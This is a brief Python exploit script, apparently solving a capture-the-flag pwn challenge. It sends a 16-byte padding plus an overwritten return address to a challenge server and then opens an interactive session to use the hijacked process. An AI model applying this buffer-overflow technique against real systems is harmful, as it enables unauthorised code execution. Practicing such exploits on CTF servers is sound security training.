from pwn64 import *
u=remote("pwn.challenge.ctf.show",28223)
payload=b'I'*16+p32(0x0804902E)
#payload=b'I'*16+p32(0x08049042)
u.sendline(payload)
u.interactive()